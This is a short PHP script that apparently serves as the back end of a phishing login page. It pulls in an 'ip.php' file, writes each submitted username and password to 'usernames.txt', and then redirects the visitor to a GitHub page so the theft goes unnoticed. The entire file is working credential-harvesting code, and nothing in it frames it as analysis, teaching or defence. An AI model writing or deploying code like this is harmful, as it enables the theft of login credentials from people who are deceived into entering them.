<?php
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com/medha-mishra/medham.unimelb.life/blob/master/');
exit();
